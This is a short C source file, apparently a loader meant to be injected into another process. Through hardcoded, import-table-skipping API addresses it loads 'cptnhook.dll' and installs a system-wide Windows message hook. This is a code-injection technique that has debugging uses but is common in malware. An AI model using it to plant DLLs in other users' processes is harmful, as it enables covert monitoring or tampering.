#include "windows.h"

DWORD WINAPI InjectMe(LPVOID lpParameter){
	typedef HMODULE(*_LoadLibrary)(LPCSTR);
	typedef FARPROC(*_GetProcAddress)(HMODULE,LPCSTR);
	typedef FARPROC(*_SetWindowsHookEx)(int , HOOKPROC, HINSTANCE, DWORD);
	typedef VOID (*_Sleep)(DWORD);
	char hookProc[] = {'H','o','o','k','P','r','o','c',0};
	char cpnHook[] = { 'c','p','t','n','h','o','o','k','.','d','l','l',0};
	_LoadLibrary ll;
	HMODULE hMod;
	_GetProcAddress gpa;
	HOOKPROC installProc;
	_SetWindowsHookEx swh;
	_Sleep slp;
	(void)lpParameter;

	//0x7c801d7b - LoadLibraryA - Skip IAT - kernel32
	ll = (_LoadLibrary)0x7c801d7b;
	hMod = ll(cpnHook);
	if (NULL == hMod){
		return (DWORD)-1;
	}

	//0x7c80ae40 - GetProcAddress - Skip IAT - kernel32
	//0x7c80ae30
	gpa = (_GetProcAddress)0x7c80ae40;

	installProc = (HOOKPROC)gpa(hMod,hookProc);
	if (NULL == installProc){
		return (DWORD)-2;
	}

	//0x7e431211 - SetWindowsHookExA - Skip IAT - user32
	swh = (_SetWindowsHookEx)0x7e431211;
	swh(WH_GETMESSAGE, installProc, hMod, 0);

	//0x7c802446 - Sleep - Skip IAT - kernel32
	slp = (_Sleep)0x7c802446;
	slp(INT_MAX);
	return 0;
}
int main (){return InjectMe((LPVOID)NULL);}